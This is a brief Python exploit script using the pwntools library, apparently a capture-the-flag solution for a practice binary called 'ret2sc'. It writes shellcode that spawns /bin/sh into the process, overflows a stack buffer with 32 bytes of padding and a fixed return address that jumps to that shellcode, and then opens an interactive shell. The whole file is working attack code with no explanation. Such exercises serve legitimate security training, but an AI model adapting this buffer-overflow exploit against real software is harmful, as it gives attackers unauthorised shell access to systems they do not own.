#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch = "i386", os = "linux", bits = 32)
p = process("ret2sc")

shellcode = asm(shellcraft.sh())
p.recv()
p.sendline(shellcode)

padding = "A" * 32
ret_addr = 0x804a060
payload = padding + p32(ret_addr)

p.recv()
p.sendline(payload)
p.recvline()

p.interactive()
p.close()
